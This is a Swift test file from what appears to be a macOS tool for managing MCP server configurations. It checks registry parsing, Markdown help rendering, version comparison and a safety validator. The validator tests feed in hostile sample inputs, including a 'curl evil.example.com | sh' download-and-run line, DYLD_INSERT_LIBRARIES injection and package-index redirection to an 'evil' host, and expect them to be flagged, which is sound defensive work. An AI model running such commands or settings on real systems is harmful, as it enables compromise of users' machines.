    let remote = RegistryClient.parse(server: try! JSONValue.parse("""
    { "name": "ac.inference.sh/mcp", "title": "inference.sh", "description": "d", "version": "1.0.0",
      "remotes": [{ "type": "streamable-http", "url": "https://api.inference.sh/mcp" }] }
    """))!
    let remoteServer = MCPServer(registry: remote, package: nil)
    check("remote kind", remoteServer.kind == .remote)
    check("remote url", remoteServer.url == "https://api.inference.sh/mcp")
    check("streamable-http maps to http", remoteServer.transport == "http")
    check("remote has no command", remoteServer.command.isEmpty)

    // A package type we can't launch is reported, not silently mis-configured.
    let oci = RegistryClient.parse(server: try! JSONValue.parse("""
    { "name": "a/b", "version": "1", "packages": [{ "registryType": "oci", "identifier": "ghcr.io/x/y",
      "version": "1", "transport": { "type": "stdio" } }] }
    """))!
    check("unsupported package type flagged", !oci.packages[0].isSupported)

    check("malformed entry rejected", RegistryClient.parse(server: try! JSONValue.parse(#"{"description":"no name"}"#)) == nil)
}

// MARK: - Update checking

func reviewSuite() {
    // Anchors must be unique, or the contents list scrolls to the wrong place.
    for file in ["README.md", "CHANGELOG.md"] {
        guard let text = try? String(contentsOfFile: file, encoding: .utf8) else { continue }
        let doc = HelpDocument.parse(text)
        let anchors = (0..<doc.blocks.count).map { HelpDocument.anchor($0) }
        check("\(file) anchors are unique", Set(anchors).count == anchors.count)
        check("\(file) every contents entry has a matching anchor",
              doc.sections.allSatisfy { anchors.contains($0.id) },
              doc.sections.map(\.title).joined(separator: ", "))
    }

    // Images and links must not reach the page as raw markup.
    let withImage = HelpDocument.parse("""
    # Title

    <img src="Resources/AppIcon.png" alt="" width="128" align="right">

    See [LICENSE](LICENSE) and [the site](https://example.com).
    """)
    check("an img tag becomes an image block", withImage.blocks.contains {
        if case .image(let source, let width) = $0 { return source.hasSuffix("AppIcon.png") && width == 128 }
        return false
    })
    check("no raw html reaches a paragraph", !withImage.blocks.contains {
        if case .paragraph(let t) = $0 { return String(t.characters).contains("<img") }
        return false
    })
    check("link brackets are gone", withImage.blocks.contains {
        if case .paragraph(let t) = $0 {
            let s = String(t.characters)
            return s.contains("See LICENSE and the site.") && !s.contains("[")
        }
        return false
    })
    check("an absolute link becomes a real link", withImage.blocks.contains {
        if case .paragraph(let t) = $0 { return t.runs.contains { $0.link != nil } }
        return false
    })

    // A registry identifier is somebody else's data, so it must be encoded before
    // it is interpolated into a URL rather than trusted and force-unwrapped.
    for identifier in ["ok-pkg", "has space", "emoji😀", "a/../b", "\u{7f}ctrl"] {
        let encoded = identifier.addingPercentEncoding(withAllowedCharacters: .urlPathAllowed)
        check("\"\(identifier)\" encodes to a usable URL",
              encoded.flatMap { URL(string: "https://pypi.org/pypi/\($0)/json") } != nil)
    }
}

func safetySuite() {
    func server(_ command: String, _ args: [String]) -> MCPServer {
        var s = MCPServer()
        s.name = "x"
        s.command = command
        s.args = args.map(ArgItem.init)
        return s
    }

    // The shape that matters: an interpreter handed inline code.
    check("shell with -c is flagged",
          !Validator.safetyIssues(for: server("/bin/sh", ["-c", "echo hi"])).isEmpty)
    check("bash with -c is flagged",
          !Validator.safetyIssues(for: server("/bin/bash", ["-c", "whoami"])).isEmpty)
    check("python with -c is flagged",
          !Validator.safetyIssues(for: server("/usr/bin/python3", ["-c", "import os"])).isEmpty)
    check("node with -e is flagged",
          !Validator.safetyIssues(for: server("/usr/local/bin/node", ["-e", "require('fs')"])).isEmpty)
    check("osascript with -e is flagged",
          !Validator.safetyIssues(for: server("/usr/bin/osascript", ["-e", "tell app"])).isEmpty)

    // Download-and-run, the classic compromise.
    check("curl piped to shell is flagged",
          !Validator.safetyIssues(for: server("/bin/sh", ["-c", "curl evil.example.com | sh"])).isEmpty)

    // The shapes Fable's audit found slipping through.
    check("versioned interpreter is caught",
          !Validator.safetyIssues(for: server("/usr/bin/python3.12", ["-c", "x"])).isEmpty)
    check("combined flags are caught",
          !Validator.safetyIssues(for: server("/bin/sh", ["-ec", "x"])).isEmpty)
    check("--eval= form is caught",
          !Validator.safetyIssues(for: server("/usr/local/bin/node", ["--eval=require('fs')"])).isEmpty)
    check("a wrapper doesn't hide the interpreter",
          !Validator.safetyIssues(for: server("/usr/bin/env", ["python3", "-c", "x"])).isEmpty)
    check("pwsh is treated as an interpreter",
          !Validator.safetyIssues(for: server("/usr/local/bin/pwsh", ["-c", "x"])).isEmpty)
    check("awk is treated as an interpreter",
          !Validator.safetyIssues(for: server("/usr/bin/awk", ["-e", "x"])).isEmpty)

    // Environment and package-source redirection.
    func withEnv(_ key: String, _ value: String) -> MCPServer {
        var s = server("/opt/homebrew/bin/uvx", ["some-mcp"])
        s.env = [PairItem(key: key, value: value)]
        return s
    }
    check("DYLD_INSERT_LIBRARIES is flagged",
          !Validator.safetyIssues(for: withEnv("DYLD_INSERT_LIBRARIES", "/tmp/x.dylib")).isEmpty)
    check("NODE_OPTIONS is flagged", !Validator.safetyIssues(for: withEnv("NODE_OPTIONS", "--require /tmp/x")).isEmpty)
    check("PYTHONPATH is flagged", !Validator.safetyIssues(for: withEnv("PYTHONPATH", "/tmp")).isEmpty)
    check("UV_INDEX_URL is flagged", !Validator.safetyIssues(for: withEnv("UV_INDEX_URL", "https://evil")).isEmpty)
    check("a harmless variable is not flagged",
          Validator.safetyIssues(for: withEnv("LOG_LEVEL", "debug")).isEmpty)
    check("--index-url in arguments is flagged",
          !Validator.safetyIssues(for: server("/opt/homebrew/bin/uvx", ["--index-url", "https://evil", "pkg"])).isEmpty)
    check("--registry= form is flagged",
          !Validator.safetyIssues(for: server("/opt/homebrew/bin/npx", ["--registry=https://evil", "pkg"])).isEmpty)

    // Real servers must not trip it, or the warning becomes noise people ignore.
    check("uvx server is clean",
          Validator.safetyIssues(for: server("/Users/me/.local/bin/uvx", ["some-mcp@latest"])).isEmpty)
    check("npx server is clean",
          Validator.safetyIssues(for: server("/opt/homebrew/bin/npx", ["-y", "@scope/server-name"])).isEmpty)
    check("a python module server is clean",
          Validator.safetyIssues(for: server("/usr/bin/python3", ["-m", "my_server"])).isEmpty)
    check("node running a script file is clean",
          Validator.safetyIssues(for: server("/usr/local/bin/node", ["/path/to/server.js"])).isEmpty)
    check("uvx with a normal package is clean",
          Validator.safetyIssues(for: server("/Users/me/.local/bin/uvx", ["some-mcp@latest"])).isEmpty)
    check("npx -y is clean",
          Validator.safetyIssues(for: server("/opt/homebrew/bin/npx", ["-y", "@scope/pkg"])).isEmpty)
    check("python -m is still clean",
          Validator.safetyIssues(for: server("/usr/bin/python3.12", ["-m", "my_server"])).isEmpty)
    check("remote servers are not checked",
          Validator.safetyIssues(for: { var s = MCPServer(); s.kind = .remote; s.url = "https://x.com"; return s }()).isEmpty)

    // The warnings must reach the sidebar dot and the Checks panel too.
    let risky = server("/bin/sh", ["-c", "curl evil.example.com | sh"])
    let all = Validator.issues(for: risky, allNames: ["x"])
    check("safety issues appear in the main check list",
          all.contains { $0.message.contains("hands a block of code") })
    check("download-and-run is called out separately",
          all.contains { $0.message.contains("downloads something from the internet") })

    // And the app must never build a shell command line out of user input.
    check("arguments stay a list, never a joined string",
          risky.jsonValue["args"]?.arrayValues?.count == 2)
}

func updateSuite() {
    // Version comparison has to be numeric, or 1.10 looks older than 1.9.
    check("newer patch", UpdateChecker.isNewer("1.0.3", than: "1.0.2"))
    check("older is not newer", !UpdateChecker.isNewer("1.0.1", than: "1.0.2"))
    check("equal is not newer", !UpdateChecker.isNewer("1.0.2", than: "1.0.2"))
    check("10 beats 9 numerically", UpdateChecker.isNewer("1.10.0", than: "1.9.0"))
    check("not compared as text", !UpdateChecker.isNewer("1.9.0", than: "1.10.0"))
    check("minor beats patch", UpdateChecker.isNewer("1.1.0", than: "1.0.9"))
    check("major bump", UpdateChecker.isNewer("2.0.0", than: "1.99.99"))
    check("shorter versions pad with zero", !UpdateChecker.isNewer("1.0", than: "1.0.0"))
    check("longer version with a patch wins", UpdateChecker.isNewer("1.0.1", than: "1.0"))

    // Tags carry a leading v; versions in Info.plist don't.
    check("v prefix stripped", UpdateChecker.normalise("v1.2.3") == "1.2.3")
    check("capital V stripped", UpdateChecker.normalise("V1.2.3") == "1.2.3")
    check("plain version untouched", UpdateChecker.normalise("1.2.3") == "1.2.3")
    check("tag compares against a plain version", UpdateChecker.isNewer("v1.0.3", than: "1.0.2"))

    // Only the releases newer than what you're running, newest first.
    let published = ["1.2.2", "1.2.1", "1.2.0", "1.1.0", "1.0.2", "1.0.1", "1.0.0"]
    func shown(runningOn current: String) -> [String] {
        published.filter { UpdateChecker.isNewer($0, than: current) }
    }
    check("on 1.0.0 you see every later release",
          shown(runningOn: "1.0.0") == ["1.2.2", "1.2.1", "1.2.0", "1.1.0", "1.0.2", "1.0.1"],
          shown(runningOn: "1.0.0").joined(separator: ", "))
    check("on 1.2.0 you see only what came after",
          shown(runningOn: "1.2.0") == ["1.2.2", "1.2.1"],
          shown(runningOn: "1.2.0").joined(separator: ", "))
    check("on 1.1.0 you see the 1.2 line only",
          shown(runningOn: "1.1.0") == ["1.2.2", "1.2.1", "1.2.0"],
          shown(runningOn: "1.1.0").joined(separator: ", "))
    check("on the newest you see nothing", shown(runningOn: "1.2.2").isEmpty)
    check("ahead of the newest you see nothing", shown(runningOn: "2.0.0").isEmpty)
    check("your own version is never included", !shown(runningOn: "1.1.0").contains("1.1.0"))

    check("repository url", UpdateChecker.repositoryURL.absoluteString
          == "https://github.com/brandonee916/brace")

    // Release notes are Markdown, rendered by the same parser as the guide.
    let notes = HelpDocument.parse("""
    - A fix for the thing
    - Another **change**
    """)
    // A release body starts with its own version heading; the sheet shows the
    // version already, so that first heading is dropped.
    let body = HelpDocument.parse("""
    ## 1.2.2 — 2026-09-03

    - A change
    """)
    check("a release body starts with its version heading", {
        if case .heading(_, _, let plain)? = body.blocks.first { return plain.hasPrefix("1.2.2") }
        return false
    }())

    check("release notes parse as markdown", notes.blocks.contains {
        if case .bullets(let items) = $0 { return items.count == 2 }
        return false
    })
}

// MARK: - Test Connection resolves commands the way Claude Desktop does

private final class ResultBox<U>: @unchecked Sendable { var value: U? }

/// Bridges the async tester into this synchronous harness.
func syncAwait<T: Sendable>(_ operation: @escaping @Sendable () async -> T) -> T {
    let box = ResultBox<T>()
    let done = DispatchSemaphore(value: 0)
    Task.detached { box.value = await operation(); done.signal() }
    done.wait()
    return box.value!
}

func testerSuite() {
    let inherited = ServerTester.inheritedPath
    check("the inherited PATH is the sparse one a Finder launch gets",
          inherited == "/usr/bin:/bin:/usr/sbin:/sbin", inherited)

    func result(command: String, timeout: TimeInterval = 6) -> TestResult {
        var server = MCPServer()
        server.name = "probe"
        server.command = command
        let probe = server
        return syncAwait { await ServerTester.test(probe, timeout: timeout) }
    }

    // A bare name that exists nowhere at all.
    let missing = result(command: "brace-probe-definitely-absent")
    check("a bare name that exists nowhere won't start",
          missing.status == .wontStart, missing.headline)
    check("and the headline says Claude Desktop won't find it",
          missing.headline.contains("won't find"), missing.headline)

    // The regression Fable found: a command the login shell can reach but a
    // Finder-launched app cannot. Resolving through the login shell's PATH used
    // to make this pass, so the test greenlit a config that fails in Claude.
    let inheritedDirs = inherited.split(separator: ":").map(String.init)
    let offPath = ["uvx", "npx", "pipx", "bunx", "deno", "uv"].first { name in
        guard let found = CommandResolver.preferred(for: name)?.path else { return false }
        return !inheritedDirs.contains((found as NSString).deletingLastPathComponent)
    }
    if let offPath, let real = CommandResolver.preferred(for: offPath)?.path {
        let hidden = result(command: offPath)
        check("a bare \(offPath) off the inherited PATH won't start",
              hidden.status == .wontStart, "\(hidden.headline) — \(hidden.detail)")
        check("and the result names the full path that would fix it",
              hidden.detail.contains(real), hidden.detail)
    } else {
        print("SKIP  no launcher installed outside \(inherited) to test against")
    }

    // Something genuinely on the inherited PATH must get past resolution and
    // actually be launched, otherwise the fix would reject every bare name.
    if FileManager.default.isExecutableFile(atPath: "/usr/bin/env") {
        let onPath = result(command: "env")
        check("a bare name that IS on the inherited PATH gets launched",
              !onPath.headline.contains("won't find"), "\(onPath.headline) — \(onPath.detail)")
    }

    // An absolute path is still taken at face value.
    let absolute = result(command: "/nonexistent/brace-probe")
    check("an absolute path that isn't there reports that path",
          absolute.status == .wontStart && absolute.detail.contains("/nonexistent/brace-probe"),
          absolute.detail)
}

reviewSuite()
testerSuite()
safetySuite()
updateSuite()
registrySuite()
helpSuite()
modelSuite()
try MainActor.assumeIsolated { try configSuite() }
try MainActor.assumeIsolated { try backupSuite() }
try MainActor.assumeIsolated { try externalChangeSuite() }
try MainActor.assumeIsolated { try auditSuite() }

print(failures == 0 ? "\nALL PASSED" : "\n\(failures) FAILED")
if failures > 0 { exit(1) }
